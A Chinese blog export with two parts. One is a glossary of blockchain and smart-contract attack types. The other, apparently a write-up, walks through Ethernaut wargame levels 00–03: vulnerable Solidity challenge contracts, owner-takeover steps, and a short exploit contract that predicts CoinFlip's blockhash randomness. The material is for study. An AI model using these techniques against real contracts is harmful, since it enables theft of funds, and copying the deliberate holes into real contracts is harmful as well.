<p>它通过持币人的统一来达成共识，目的是确定出新区块，这过程相对于PoW，不需要硬件和电力，效率更高。PoS 共识中引入了 Stake 的概念，持币人将代币进行 Staking，要求所有的参与者抵押一部分他们所拥有的 Token 来验证交易，然后获得出块的机会，PoS 共识中会通过选举算法，按照持币量比例以及 Token 抵押时长，或者是一些其他的方式，选出打包区块的矿工。矿工在指定高度完成打包交易，生成新区块，并广播区块，广播的区块经过 PoS 共识中另外一道”门槛”，验证人验证交易，通过验证后，区块得到确认。</p>
<p>这样一轮 PoS 的共识过程就进行完成了。权益证明通过长期绑定验证者的利益和整个网络的利益来阻止不良行为。锁定代币后，如果验证者存在欺诈性交易，那么他们所抵押的 Token 也会被削减。</p>
</li>
<li><p><strong>委托权益证明 DPoS（Delegate Proof of Stake）：</strong>在委托权益证明中，让每一个持币者都可以进行投票，由此产生一定数量的代表，他们彼此之间的权利是完全相等的。</p>
</li>
</ul>
<h3 id="多签-Multi-sig"><a href="#多签-Multi-sig" class="headerlink" title="多签 Multi-sig"></a>多签 Multi-sig</h3><p>指的是需要多个签名才能执行的操作（这些签名是不同私钥生成的）。</p>
<h2 id="一些公链攻击方式"><a href="#一些公链攻击方式" class="headerlink" title="一些公链攻击方式"></a>一些公链攻击方式</h2><h3 id="恶意挖矿攻击-Cryptojacking-Attack"><a href="#恶意挖矿攻击-Cryptojacking-Attack" class="headerlink" title="恶意挖矿攻击 Cryptojacking Attack"></a>恶意挖矿攻击 Cryptojacking Attack</h3><p>指未授权下劫持用户设备挖掘加密货币。</p>
<h3 id="无利益攻击-Nothin-at-Stake-Attack"><a href="#无利益攻击-Nothin-at-Stake-Attack" class="headerlink" title="无利益攻击 Nothin at Stake Attack"></a>无利益攻击 Nothin at Stake Attack</h3><p>可以简单概括为“作恶无成本，好处无限多”。当 PoS 共识系统出现分叉(Fork)时，出块节点可以在“不受任何损失”的前提下，同时在两个分叉上出块；无论哪一个分叉后面被公认为主链，该节点都可以获得“所有收益”且不会有任何成本损失。这就很容易给某些节点一种动力去产生新的分叉，支持或发起不合法交易，其他逐利的出块节点会同时在多条链(窗口)上排队出块支持新的分叉。随着时间的推移，分叉越来越多，非法交易，作恶猖狂。区块链将不再是唯一链，所有出块节点没有办法达成共识。</p>
<p>为了预防这样的情况发生，许多类 PoS 共识机制对此的解决方法是引入惩罚机制，对作恶的节点进行经济惩罚(Slashing)，以建立更加稳定的网络。DPoS 实际上也是无利益攻击的解决方案之一，由上文我们可知 DPoS 这个机制由持币人选出出块节点来运营网络，出块节点会将一部分奖励分给投票者。</p>
<h3 id="双花攻击-Double-Spend-Attack"><a href="#双花攻击-Double-Spend-Attack" class="headerlink" title="双花攻击 Double Spend Attack"></a>双花攻击 Double Spend Attack</h3><p>即一笔钱花了两次，双重支付，利用货币的数字特性两次或多次使用“同一笔钱”完成支付。双花不会产生新的 Token，但能把自己花出去的钱重新拿回来。简单说就是，攻击者将一笔 Token 转到另外一个地址，通常是转到交易所进行套现，然后再利用一些攻击手法对转账交易进行回滚。</p>
<p>目前有常见的几种手法能够引发双花攻击：</p>
<h4 id="01-Race-Attack"><a href="#01-Race-Attack" class="headerlink" title="01 Race Attack"></a>01 Race Attack</h4><p>这种攻击主要通过控制矿工费来实现双花。</p>
<h4 id="02-Finney-Attack"><a href="#02-Finney-Attack" class="headerlink" title="02 Finney Attack"></a>02 Finney Attack</h4><p>攻击者主要通过控制区块的广播时间来实现双花，攻击对象针对的是接受0确认的商家。</p>
<h4 id="03-Vector76-Attack"><a href="#03-Vector76-Attack" class="headerlink" title="03 Vector76 Attack"></a>03 Vector76 Attack</h4><p>又称“一次确认攻击”，也就是交易确认一次后仍然可以回滚，是 Finney Attack 和 Race Attack 的组合</p>
<h4 id="04-51-Attack"><a href="#04-51-Attack" class="headerlink" title="04 51% Attack"></a>04 51% Attack</h4><p>攻击者占有超过全网50%的算力，在攻击者控制算力的这段时间，他可以创造一条高度大于原来链的新链。那么旧链中的交易会被回滚，攻击者可以使用同一笔 Token 发送一笔新的交易到新链上。</p>
<h3 id="软分叉-Soft-fork"><a href="#软分叉-Soft-fork" class="headerlink" title="软分叉 Soft-fork"></a>软分叉 Soft-fork</h3><p>当新共识规则发布后，没有升级的旧节点并不会意识到代码已经发生改变，而继续生产不合法的区块，就会产生临时性分叉。</p>
<h3 id="硬分叉-Hard-fork"><a href="#硬分叉-Hard-fork" class="headerlink" title="硬分叉 Hard-fork"></a>硬分叉 Hard-fork</h3><p>在新共识规则发布后，已经升级的节点无法验证未升级节点产生的区块，未升级节点也无法验证已经升级的节点产生新的区块，即新旧节点互不兼容，原有正常的一条链被分成了两条链。</p>
<h3 id="异形攻击-Alien-Attack"><a href="#异形攻击-Alien-Attack" class="headerlink" title="异形攻击 Alien Attack"></a>异形攻击 Alien Attack</h3><p>又称地址池污染，是指诱使同类链的节点互相侵入的一种攻击手法，漏洞的主要原因是同类链系统在通信协议上没有对不同链的节点做识别。</p>
<h3 id="钓鱼攻击-Phishing"><a href="#钓鱼攻击-Phishing" class="headerlink" title="钓鱼攻击 Phishing"></a>钓鱼攻击 Phishing</h3><p>社工，套取用户名、密码、私钥等私密信息。</p>
<h3 id="木马攻击-Trojan-Horse-Attack"><a href="#木马攻击-Trojan-Horse-Attack" class="headerlink" title="木马攻击 Trojan Horse Attack"></a>木马攻击 Trojan Horse Attack</h3><p>木马病毒</p>
<h3 id="供应链攻击-Supply-Chain-Attack"><a href="#供应链攻击-Supply-Chain-Attack" class="headerlink" title="供应链攻击 Supply Chain Attack"></a>供应链攻击 Supply Chain Attack</h3><p>由于现在的软件工程，各种包&#x2F;模块的依赖十分频繁、常见，而开发者们很难做到一一检查，默认都过于信任市面上流通的包管理器。</p>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p>一种计算机协议，是以数字方式促进、验证或执行合同的谈判或履行。在区块链领域中，智能合约本质可以说是一段运行在区块链网络中的代码，它以计算机指令的方式实现了传统合约的自动化处理，完成用户所赋予的业务逻辑。</p>
<h3 id="交易回滚攻击-Roll-Back-Attack"><a href="#交易回滚攻击-Roll-Back-Attack" class="headerlink" title="交易回滚攻击 Roll Back Attack"></a>交易回滚攻击 Roll Back Attack</h3><p>指的是能对交易的状态进行回滚，回滚指的是将已经发生的交易编程未发生的状态。即攻击者已经完成了支付动作，但是通过某些手段，让转账流程发生错误，从而回滚整个交易流程。</p>
<h3 id="交易排挤攻击-Transaction-Congestion-Attack"><a href="#交易排挤攻击-Transaction-Congestion-Attack" class="headerlink" title="交易排挤攻击 Transaction Congestion Attack"></a>交易排挤攻击 Transaction Congestion Attack</h3><p>是针对 EOS 上的使用 defer 进行开奖的游戏合约的一种攻击手法，攻击者可以通过某些手段，在游戏合约的 defer 开奖交易前发送大量的 defer 交易，恶意侵占区块内的 CPU 资源，使得智能合约内本应在指定区块内执行的 defer 开奖交易因资源不足无法执行，只能去到下一个区块才执行。</p>
<p>由于很多 EOS 上的游戏智能合约使用区块信息作为智能合约本身的随机数，同一个 defer 开奖交易在不同区块内的执行结果是不一样的。通过这样的方式，攻击者在获知无法中奖的时候，就通过发送大量的 defer 交易，强行让智能合约重新开奖，从而达到攻击目的。</p>
<h3 id="随机数攻击-Random-Number-Attack"><a href="#随机数攻击-Random-Number-Attack" class="headerlink" title="随机数攻击 Random Number Attack"></a>随机数攻击 Random Number Attack</h3><p>就是针对智能合约的随机数生成算法进行攻击，预测只能合约的随机数。</p>
<h3 id="状态攻击-hard-fail-Attack"><a href="#状态攻击-hard-fail-Attack" class="headerlink" title="状态攻击 hard_fail Attack"></a>状态攻击 hard_fail Attack</h3><p>hard-fail 是 EOS 上的一种交易状态（共有 executed、soft_fail、hard_fail、delayed、expired 这5种），发生在出现错误但是没有使用错误处理器（error handler）处理错误的情况下。通常在链上大部分人观察到的交易，都是 execute 或 delayed 的，而没有失败的交易。攻击者利用这个细节，针对链上游戏或交易所进行攻击，构造执行状态为 hard_fail 的交易，欺骗链上游戏或交易所进行假充值攻击，从而获利。</p>
<h3 id="重放攻击-Replay-Attack"><a href="#重放攻击-Replay-Attack" class="headerlink" title="重放攻击 Replay Attack"></a>重放攻击 Replay Attack</h3><p>是针对区块链上的交易信息进行重放，一般来说，区块链会对交易进行各种验证，包括交易的时间戳、nonce、交易id 等。这种场景一般需要用户对某一条消息进行签名后上传给智能合约，然后再合约内部进行验签。但由于用户的签名信息是会上链的，也就是说每个人都能拿到用户的签名信息，如果被签名的消息不存在随着交易次数变化的变量，如时间戳、nonce 等，攻击者就可以拿着用户的签名，伪造用户发起交易，从而获利。</p>
<h3 id="重入攻击-Reentrancy-Attack"><a href="#重入攻击-Reentrancy-Attack" class="headerlink" title="重入攻击 Reentrancy Attack"></a>重入攻击 Reentrancy Attack</h3><p>首次出现于以太坊，对应的真实攻击为 The DAO 攻击，此次攻击还导致了原来的以太坊分叉成以太经典（ETC）和现在的以太坊（ETH）。由于项目方采用的转账模型为先给用户发送转账才对用户的余额状态进行修改，导致恶意用户可以构造恶意合约，在接受转账的同时再次调用项目方的转账函数。导致用户的余额状态没有被改变，却能一直提取项目方资金。</p>
<h3 id="假充值攻击-False-Top-up"><a href="#假充值攻击-False-Top-up" class="headerlink" title="假充值攻击 False Top-up"></a>假充值攻击 False Top-up</h3><p>分为针对只能合约的假充值攻击和对交易所的假充值攻击。在假充值攻击中，无论智能合约还是交易所本身，都没有收到真实的 Token，但是用户又得到了真实的充值记录。</p>
<ul>
<li><p><strong>智能合约假充值攻击：</strong></p>
<p>针对智能合约的假充值主要是假币的假充值，这种攻击手法多发于 EOS 和波场上。</p>
</li>
<li><p><strong>交易所假充值攻击：</strong></p>
<p>针对交易所的假充值攻击分为假币攻击和交易状态失败的假充值攻击。</p>
</li>
</ul>
<h3 id="短地址攻击-Short-Address-Attack"><a href="#短地址攻击-Short-Address-Attack" class="headerlink" title="短地址攻击 Short Address Attack"></a>短地址攻击 Short Address Attack</h3><p>是针对以太坊上 ERC20 智能合约的一种攻击形式，利用的是 EVM 中的对于输入字节码的自动补全机制进行攻击。</p>
<h3 id="假币攻击-Fake-Token-Attack"><a href="#假币攻击-Fake-Token-Attack" class="headerlink" title="假币攻击 Fake Token Attack"></a>假币攻击 Fake Token Attack</h3><p>收款方对一些 Token 进行收款的时候没有严格校验这些 Token 特有的标记，攻击就会发生。</p>
<h3 id="整型溢出攻击-Interger-Overflow-Attack"><a href="#整型溢出攻击-Interger-Overflow-Attack" class="headerlink" title="整型溢出攻击 Interger Overflow Attack"></a>整型溢出攻击 Interger Overflow Attack</h3><p>略。</p>
<h3 id="条件竞争攻击-Race-Condition"><a href="#条件竞争攻击-Race-Condition" class="headerlink" title="条件竞争攻击 Race Condition"></a>条件竞争攻击 Race Condition</h3><p>重入攻击（Reentrancy Attack）是条件竞争的一种。略。</p>
<h3 id="越权访问攻击-Exceed-Authority-Access-Attack"><a href="#越权访问攻击-Exceed-Authority-Access-Attack" class="headerlink" title="越权访问攻击 Exceed Authority Access Attack"></a>越权访问攻击 Exceed Authority Access Attack</h3><p>略。</p>
<h3 id="交易顺序依赖攻击-Transaction-Ordering-Attack"><a href="#交易顺序依赖攻击-Transaction-Ordering-Attack" class="headerlink" title="交易顺序依赖攻击 Transaction-Ordering Attack"></a>交易顺序依赖攻击 Transaction-Ordering Attack</h3><p>在区块链的世界当中，一笔交易内可能含有多个不同的交易，而这些交易执行的顺序会影响最终的交易的执行结果，由于在挖矿机制的区块链中，交易未被打包前都处于一种待打包的 pending 状态，如果能事先知道交易里面执行了哪些其他交易，恶意用户就能通过增加矿工费的形式，发起一笔交易，让交易中的其中一笔交易先行打包，扰乱交易顺序，造成非预期内的执行结果，达成攻击。</p>
<h3 id="女巫攻击-Sybil-Attack"><a href="#女巫攻击-Sybil-Attack" class="headerlink" title="女巫攻击 Sybil Attack"></a>女巫攻击 Sybil Attack</h3><p>某个恶意节点可以伪装成多个节点，向被攻击节点发出链接请求，导致节点没办法接受其他节点的请求，造成节点拒绝服务攻击。</p>
<h3 id="假错误通知攻击-Fake-Onerror-Notification-Attack"><a href="#假错误通知攻击-Fake-Onerror-Notification-Attack" class="headerlink" title="假错误通知攻击 Fake Onerror Notification Attack"></a>假错误通知攻击 Fake Onerror Notification Attack</h3><p>如果合约没有对 onerror 通知的来源合约是否是 eosio 进行检验的话，就会触发合约中对 onerror 的处理，从而导致被攻击合约资产遭受损失。</p>
<h3 id="粉尘攻击-Dusting-Attack"><a href="#粉尘攻击-Dusting-Attack" class="headerlink" title="粉尘攻击 Dusting Attack"></a>粉尘攻击 Dusting Attack</h3><p>粉尘攻击最早发生于比特币网络中，粉尘指的是交易中的交易金额相对于正常交易而言十分地小，可以视作微不足道的粉尘。在采用 UTXO 模型作为账户资金系统的比特币中，通过给大量的账户发送这些粉尘金额，令交易粉尘化，然后再通过追踪这些粉尘交易，关联出该地址的其他关联地址，通过对这些关联地址进行行为分析，社工出一个地址背后的公司或个人，破坏比特币本身的匿名性。同时，大量的粉尘交易会造成区块的拥堵，使得手续费提升，进而产生大量待打包交易，降低系统本身的运行效率。</p>
<h3 id="C2攻击-C2-Attack"><a href="#C2攻击-C2-Attack" class="headerlink" title="C2攻击 C2 Attack"></a>C2攻击 C2 Attack</h3><p>C2 全称 Command and Control，命令执行与控制。</p>
<h3 id="洗币-Money-Laundering"><a href="#洗币-Money-Laundering" class="headerlink" title="洗币 Money Laundering"></a>洗币 Money Laundering</h3><p>略。</p>
<h3 id="勒索-Ransom"><a href="#勒索-Ransom" class="headerlink" title="勒索 Ransom"></a>勒索 Ransom</h3><p>略。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
  </entry>
  <entry>
    <title>Ethernaut WP _持续更新中。。。</title>
    <url>/2023/10/07/Ethernaut-wp/</url>
    <content><![CDATA[<h2 id="00-Hello-Ethernaut"><a href="#00-Hello-Ethernaut" class="headerlink" title="00 Hello Ethernaut"></a>00 Hello Ethernaut</h2><p>这是引导的关卡，只需要配置好 MetaMask ，支付一些测试币，然后在控制台与合约进行互动，即可过关。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Instance &#123;</span><br><span class="line"></span><br><span class="line">  string public password;</span><br><span class="line">  uint8 public infoNum = 42;</span><br><span class="line">  string public theMethodName = &#x27;The method name is method7123949.&#x27;;</span><br><span class="line">  bool private cleared = false;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _password) &#123;</span><br><span class="line">    password = _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;You will find what you need in info1().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info1() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;Try info2(), but with &quot;hello&quot; as a parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info2(string memory param) public pure returns (string memory) &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked(&#x27;hello&#x27;))) &#123;</span><br><span class="line">      return &#x27;The property infoNum holds the number of the next info method to call.&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    return &#x27;Wrong parameter.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function info42() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;theMethodName is the name of the next method.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function method7123949() public pure returns (string memory) &#123;</span><br><span class="line">    return &#x27;If you know the password, submit it to authenticate().&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function authenticate(string memory passkey) public &#123;</span><br><span class="line">    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) &#123;</span><br><span class="line">      cleared = true;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getCleared() public view returns (bool) &#123;</span><br><span class="line">    return cleared;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="01-Fallback"><a href="#01-Fallback" class="headerlink" title="01 Fallback"></a>01 Fallback</h2><p>这是一道白盒题目，源码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    payable(owner).transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>题目要求：</p>
<ul>
<li>获得这个合约的所有权</li>
<li>把它的余额减到0</li>
</ul>
<p>分析源码，成为合约的 owner 有两种方式：</p>
<ol>
<li>通过不停贡献合约，使当前用户贡献值大于 owner</li>
<li>在已有贡献记录的前提下，向合约发送大于零的以太币</li>
</ol>
<p>由于单次贡献的额度被限制到了0.001ETH 以下，所以不可能通过第一种方式成为 owner（要贡献100万次捏）。那么试一下第二种方式：</p>
<p>首先我们把合约跑起来，可以看到 owner 有很高的初始贡献值：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308090302300.png"
                      alt="image-20230809030209945"
                ></p>
<p>现在我们更换用户，贡献一下看看：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308090306707.png"
                      alt="image-20230809030601235"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308090306959.png"
                      alt="image-20230809030613402"
                ></p>
<p>奇怪，贡献了很多次，但是贡献值还是0。</p>
<p>去看了看 Remix 的使用，在调用函数时设置好发送的金额即可。（我真傻，真的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308092105719.png"
                      alt="image-20230809210513962"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308092105679.png"
                      alt="image-20230809210526529"
                ></p>
<p>我们把自己的贡献值加到2000，这就满足<code>receive()</code>函数里面成为 owner 其中一个条件了。</p>
<p>关于<code>receive()</code>，当合约接收ETH的时候它会被触发。条件有两个，一是<code>msg.data</code>为空，二是<code>receive()</code>存在。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202309071410829.png"
                      alt="image-20230907141005773"
                ></p>
<p>Remix IDE有个可以向合约发送 CALLDATA 的功能，设置金额后把 CALLDATA 留空然后发送即可，这样就能顺利触发<code>receive()</code>函数。满足成为 owner 的条件，owner 成功变更：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308092155107.png"
                      alt="image-20230809215512188"
                ></p>
<p>下一步把合约的余额清空，调用提现用的<code>withdraw()</code>函数即可：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308092156103.png"
                      alt="image-20230809215635248"
                ></p>
<p>Balance 处已经变为0了。</p>
<p>接下来在线上环境打一遍，难点在对于<code>web3-eth</code>包中<code>sendTransaction()</code>函数的<a class="link"   href="https://learnblockchain.cn/docs/web3.js/web3-eth.html#sendtransaction" >使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，还有就是不依赖 Remix 对合约的函数进行调用，一般以太坊交易包含四个字段，分别是 to、from、amout、data ，其中函数调用信息封装在 data 字段中（<code>sendTransaction()</code>中形参叫做 value）。</p>
<p>data 字段的数据是对函数签名字符串进行 keccak256 哈希运算之后，取前四个字节。contribute()attack()</p>
<p>先看看调用 contribute 的操作（图丢了，假装有个图吧。应该有个 data 字段，值为 0xd7bb99ba）：</p>
<p>然后是 receive：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308092311131.png"
                      alt="image-20230809231110635"
                ></p>
<p>随后再进行 withdraw 的调用即可过关：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308092329572.png"
                      alt="image-20230809232951547"
                ></p>
<p>这里需要注意，对于没有用 payable 修饰的方法，其 amout(value) 只能为0</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308092329101.png"
                      alt="image-20230809232920062"
                ></p>
<p>满足过关条件了</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308092331871.png"
                      alt="image-20230809233126836"
                ></p>
<h2 id="02-Fal1out"><a href="#02-Fal1out" class="headerlink" title="02 Fal1out"></a>02 Fal1out</h2><p>看关卡名字估计是<del>整型溢出</del>吧，源码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">    using SafeMath for uint256; // 应用附加库SafeMath到uint256类型</span><br><span class="line">    mapping(address =&gt; uint256) allocations; // 创建一个地址-&gt;整形的映射</span><br><span class="line">    address payable public owner; // owner的地址变量</span><br><span class="line"></span><br><span class="line">    function Fal1out() public payable &#123;</span><br><span class="line">        // 合约的构造函数</span><br><span class="line">        owner = msg.sender; // 初始化owner</span><br><span class="line">        allocations[owner] = msg.value; // allocation分配额的意思</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        // 判断是否为owner的函数修改器</span><br><span class="line">        require(msg.sender == owner, &quot;caller is not the owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocate() public payable &#123;</span><br><span class="line">        // 充值用的函数，会调用SafeMath库里面的add()函数</span><br><span class="line">        allocations[msg.sender] = allocations[msg.sender].add(msg.value); // 将发送的ETH增加到对应的分配额中</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">        // 若分配额&gt;0，则将分配额的ETH转给allocator</span><br><span class="line">        require(allocations[allocator] &gt; 0);</span><br><span class="line">        allocator.transfer(allocations[allocator]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectAllocationys() public onlyOwner &#123;</span><br><span class="line">        // 将合约余额全部转给owner</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function allocatorBalance(address allocator) public view returns (uint256) &#123;</span><br><span class="line">        // 查询allocator的分配额余额</span><br><span class="line">        return allocations[allocator];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>题目要求是成为该合约的 owner，猜测是 SafeMath 库中的<code>add()</code>函数有漏洞（bushi）。</p>
<p>add()：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a, &quot;SafeMath: addition overflow&quot;);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这函数看着也没啥问题啊。。直接试着调用一下构造函数：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308121825627.png"
                      alt="image-20230812182550567"
                ></p>
<p>这里的构造函数可以直接调用的原因是，在这个（0.6.x）大版本中构造函数是一个名称与合约名相同的函数，而没有使用关键字等标识修饰。题目中<code>Fal1out()</code>函数与合约名不同，因此不被认为是构造函数，导致该函数被直接调用。</p>
<p>看一眼 owner，好家伙，直接变成我了：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308121826811.png"
                      alt="image-20230812182637789"
                ></p>
<p>过关。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://cdn.jsdelivr.net/gh/F4tBe3/AutoUploadPics/img/202308121827656.png"
                      alt="image-20230812182713614"
                ></p>
<h2 id="03-Coin-Flip"><a href="#03-Coin-Flip" class="headerlink" title="03 Coin Flip"></a>03 Coin Flip</h2><p>本题代码如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">    uint256 public consecutiveWins; // 连胜数</span><br><span class="line">    uint256 lastHash; // 用于储存上个区块的哈希值</span><br><span class="line">    uint256 FACTOR =</span><br><span class="line">        57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line">     //115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        consecutiveWins = 0; // 连胜数</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1)); // 上一区块哈希</span><br><span class="line"></span><br><span class="line">        if (lastHash == blockValue) &#123;</span><br><span class="line">            // 将上一区块的哈希值与储存的上一个哈希进行比较</span><br><span class="line">            revert(); // 若相等，回滚</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        lastHash = blockValue; // 将本区块哈希储存</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        if (side == _guess) &#123;</span><br><span class="line">            // 猜对</span><br><span class="line">            consecutiveWins++;</span><br><span class="line">            return true;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // 猜错</span><br><span class="line">            consecutiveWins = 0;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>目标是连续猜对结果10次</p>
<p>看样子和随机数的安全性有关，可以自己部署一个镜像合约来进行硬币结果的预测：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract H4cker &#123;</span><br><span class="line">    CoinFlip public myCoinFlip;</span><br><span class="line">    uint256 FACTOR =</span><br><span class="line">        57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    constructor(address _adress) public &#123;</span><br><span class="line">        myCoinFlip = CoinFlip(_adress);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number - 1));</span><br><span class="line">        uint256 coinFlip = blockValue / FACTOR;</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        myCoinFlip.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里利用自己构造的攻击脚本去调用目标合约的 flip 函数，经过攻击合约的预测，重复执行10次 hack 函数即可。</p>
